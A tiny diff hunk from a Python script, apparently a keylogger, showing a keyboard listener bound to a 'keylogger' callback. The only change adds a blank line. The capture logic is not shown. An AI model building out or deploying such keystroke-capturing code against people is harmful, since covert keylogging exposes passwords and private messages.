@@ -30,3 +30,4 @@ def keylogger(key):
 
 with listener(on_press=keylogger) as listen:
     listen.join()
+    
